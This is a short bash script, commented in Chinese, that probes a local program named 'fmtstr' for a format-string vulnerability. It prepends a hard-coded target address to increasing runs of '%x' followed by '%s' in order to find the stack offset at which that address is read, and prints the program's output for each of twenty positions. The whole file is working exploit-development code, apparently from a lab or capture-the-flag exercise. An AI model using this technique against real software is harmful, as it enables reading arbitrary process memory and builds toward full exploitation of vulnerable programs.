#!/bin/bash

# echo $(printf "\x64\xe9\xff\xbf").%x.%x.%x.%x.%x.%x.%x.%x > input
TARGET_ADDR="\x64\xe9\xff\xbf"  # 替换为你的目标地址

for i in {1..20}; do
  # 构造输入：前i-1个%x，第i个位置放%s，最后加一个%x用作对比
  prefix=""
  if [ $i -gt 1 ]; then
    prefix=$(printf ".%%x%.0s" $(seq 1 $(($i-1))))
  fi
  
  # 创建测试字符串
  test_str=$(printf "${TARGET_ADDR}${prefix}.%%s.%%x")
  
  echo "Testing with %s at position $i:"
  echo "$test_str" > input_test
  
  # 显示原始字符串（调试用）
  echo "Input: $test_str"
  
  # 运行程序并获取输出
  output=$(./fmtstr < input_test)
  
  # 提取并显示结果
  echo "$output" | grep -A 2 "Please enter"
  echo "----------------------------------------"
done